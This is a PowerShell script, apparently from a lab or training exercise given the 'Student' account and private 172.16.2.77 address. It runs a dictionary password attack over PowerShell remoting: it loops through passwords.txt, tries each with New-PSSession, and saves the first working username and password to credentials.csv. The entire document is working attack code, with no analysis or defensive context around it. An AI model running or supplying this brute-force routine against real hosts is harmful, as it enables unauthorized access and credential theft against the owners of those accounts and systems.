# Import the txt file with passwords
$passwords = Get-Content -Path "Powershell\passwords.txt"

# Define username
$username = "Student"
# Define IP address
$ip = "172.16.2.77"

# Define filename + filepath to save to
$out = "Powershell\credentials.csv"

# Get the first set of credentials from the dictionary
foreach ($password in $passwords) {
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credentialObject = New-Object System.Management.Automation.PSCredential($username, $securePassword)
    # Try to start a new PSSession with the IP address and the credentials
    New-PSSession -ComputerName $ip -Credential $credentialObject -ErrorAction SilentlyContinue

    if ($?) {
        #Write-Host "New-PSSession succeeded"
        Exit-PSSession
        # Print the password and that it succeeded
        Write-Host "Succeeded: $password"
        # Append the username and successful password on a new line in credentials.csv
        Add-Content -Path $out -Value "`r`n$username,$password"
        Write-Host "Added credentials to credentials.csv."
        break
    }
    else {
        #Write-Host "New-PSSession failed"
        # Print the password and that it failed
        Write-Host "Failed: $password"
    }
}
